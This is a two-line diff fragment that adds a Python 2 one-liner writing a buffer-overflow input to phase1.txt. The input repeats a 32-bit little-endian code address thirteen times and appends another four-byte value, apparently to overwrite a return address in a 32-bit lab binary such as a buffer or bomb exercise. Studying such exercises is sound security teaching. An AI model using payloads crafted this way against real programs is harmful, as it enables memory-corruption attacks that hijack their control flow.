@@ -1,0 +1,2 @@
+ python -c "print '\x3e\x8b\x04\x08' * 13 + '\x85\xf8\xd5\x4e'" > phase1.txt
+
